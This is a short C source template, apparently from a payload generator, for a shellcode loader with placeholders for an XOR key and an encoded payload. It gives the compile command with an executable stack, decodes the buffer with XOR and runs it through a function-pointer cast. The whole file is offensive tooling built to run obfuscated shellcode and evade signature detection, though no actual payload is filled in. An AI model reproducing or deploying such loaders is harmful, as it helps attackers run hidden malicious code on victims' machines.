#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// To compile:
// gcc -o simpleLoader simpleLoader.c -z execstack

// XOR-encoded shellcode (key: 0x{{ xor_key }})
{{ c_payload }}

int main (int argc, char **argv)
{
        int key = 0x{{ xor_key }};
        int buf_len = (int) sizeof(buf);

        // Decode the payload
        for (int i=0; i<buf_len; i++)
        {
                buf[i] = buf[i] ^ key;
        }

        // Cast the shellcode to a function pointer and execute
        int (*ret)() = (int(*)())buf;
        ret();
}
